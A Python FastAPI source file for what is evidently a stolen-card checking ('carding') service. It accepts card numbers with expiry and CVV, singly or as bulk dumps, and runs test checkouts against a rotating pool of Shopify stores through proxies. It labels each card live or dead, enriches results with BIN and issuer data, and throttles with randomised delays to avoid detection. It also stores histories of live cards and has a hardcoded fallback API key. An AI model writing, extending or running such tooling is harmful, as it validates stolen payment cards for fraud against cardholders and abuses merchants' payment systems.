import time, random, string, threading
import requests
from fastapi import FastAPI, Header, HTTPException
from pydantic import BaseModel
from typing import Optional

from proxy_manager import proxy_mgr
from shop_scanner  import shop_pool
from checkout      import run_checkout
from bin_cache     import bin_lookup
from utils         import validate_card, dup_filter
from history       import record, get_stats, get_hourly, get_live_history, get_dead_history, get_logs
from rate_limiter  import is_rate_limited

API_KEY = __import__("os").environ.get("API_KEY", "kanha-secret-2024")

app = FastAPI(docs_url=None, redoc_url=None)

# ─────────────────────────────────────────
# AUTH
# ─────────────────────────────────────────

def auth(key: str):
    if key != API_KEY:
        raise HTTPException(401, "INVALID_KEY")

# ─────────────────────────────────────────
# CORE CHECK
# ─────────────────────────────────────────

def check_card(cc, month, year, cvv) -> dict:
    for attempt in range(3):
        shop = shop_pool.get()
        if not shop:
            time.sleep(2)
            continue

        try:
            result = run_checkout(shop, cc, month, year, cvv)

            if result["result"] == "ERROR":
                shop_pool.mark_fail(shop["domain"])
                continue

            shop_pool.mark_win(shop["domain"])
            result["shop"] = shop["domain"]
            return result

        except Exception as e:
            shop_pool.mark_fail(shop["domain"])
            if attempt == 2:
                return {"result":"ERROR","reason":str(e),
                        "message":"","amount":"0.00","shop":shop["domain"]}
            time.sleep(1.0)

    return {"result":"ERROR","reason":"MAX_RETRIES",
            "message":"","amount":"0.00","shop":"none"}


def format_resp(cc, month, year, cvv, result: dict, elapsed: float) -> dict:
    bin_data = bin_lookup(cc)
    country  = f"{bin_data['emoji']} {bin_data['country']}"
    is_live  = result["result"] == "LIVE"
    response = result.get("reason", "UNKNOWN")

    return {
        "cc":       f"{cc}|{month}|{year}|{cvv}",
        "Gateway":  "Shopify Payments",
        "Response": response,
        "Amount":   result.get("amount", "1.00"),
        "Currency": "USD",
        "Brand":    bin_data["brand"],
        "Type":     bin_data["type"],
        "Level":    bin_data["level"],
        "Issuer":   bin_data["issuer"],
        "Country":  country,
        "Shop":     result.get("shop", ""),
        "Status":   is_live,
        "Proxy":    "Used" if proxy_mgr.status()["live"] > 0 else "Not Used",
        "Time":     f"{elapsed:.2f}s"
    }

# ─────────────────────────────────────────
# MODELS
# ─────────────────────────────────────────

class CardReq(BaseModel):
    cc: str; month: str; year: str; cvv: str

class BulkReq(BaseModel):
    cards: list[str]
    delay: Optional[float] = 1.2

# ─────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────

@app.get("/")
def root():
    return {
        "status":  "alive",
        "shops":   len([s for s in shop_pool._shops if s["healthy"]]),
        "proxies": proxy_mgr.status()["live"],
    }

@app.post("/check")
def check(card: CardReq, x_api_key: str = Header(...)):
    auth(x_api_key)

    ok, reason = validate_card(card.cc, card.month, card.year, card.cvv)
    if not ok:
        return {"cc": f"{card.cc}|{card.month}|{card.year}|{card.cvv}",
                "Response": reason, "Status": False, "Time": "0.00s"}

    if dup_filter.is_duplicate(card.cc):
        return {"cc": f"{card.cc}|{card.month}|{card.year}|{card.cvv}",
                "Response": "DUPLICATE_CARD", "Status": False, "Time": "0.00s"}

    if is_rate_limited(x_api_key):
        raise HTTPException(429, "RATE_LIMIT_EXCEEDED")

    start   = time.time()
    res     = check_card(card.cc, card.month, card.year, card.cvv)
    elapsed = time.time() - start
    out     = format_resp(card.cc, card.month, card.year, card.cvv, res, elapsed)
    record(out["cc"], res, elapsed)
    return out

@app.post("/bulk")
def bulk(req: BulkReq, x_api_key: str = Header(...)):
    auth(x_api_key)
    results = []

    for line in req.cards:
        p = line.strip().split("|")
        if len(p) != 4:
            results.append({"cc": line, "Response": "BAD_FORMAT", "Status": False})
            continue
        cc, month, year, cvv = p

        ok, reason = validate_card(cc, month, year, cvv)
        if not ok:
            results.append({"cc": line, "Response": reason, "Status": False})
            continue
        if dup_filter.is_duplicate(cc):
            results.append({"cc": line, "Response": "DUPLICATE_CARD", "Status": False})
            continue

        start   = time.time()
        res     = check_card(cc, month, year, cvv)
        elapsed = time.time() - start
        out     = format_resp(cc, month, year, cvv, res, elapsed)
        record(out["cc"], res, elapsed)
        results.append(out)
        time.sleep(req.delay + random.uniform(0, 0.3))

    return {
        "total":   len(results),
        "live":    sum(1 for r in results if r.get("Status")),
        "dead":    sum(1 for r in results if not r.get("Status")),
        "results": results
    }

@app.get("/shops")
def shops(x_api_key: str = Header(...)):
    auth(x_api_key)
    return {"shops": shop_pool.status()}

@app.get("/proxies")
def proxies(x_api_key: str = Header(...)):
    auth(x_api_key)
    return proxy_mgr.status()

@app.get("/stats")
def stats(x_api_key: str = Header(...)):
    auth(x_api_key)
    return {"global": get_stats(), "hourly": get_hourly()}

@app.get("/history/live")
def live_hist(x_api_key: str = Header(...)):
    auth(x_api_key)
    return {"cards": get_live_history()}

@app.get("/history/dead")
def dead_hist(x_api_key: str = Header(...)):
    auth(x_api_key)
    return {"cards": get_dead_history()}

@app.get("/logs")
def logs(x_api_key: str = Header(...)):
    auth(x_api_key)
    return {"logs": get_logs()}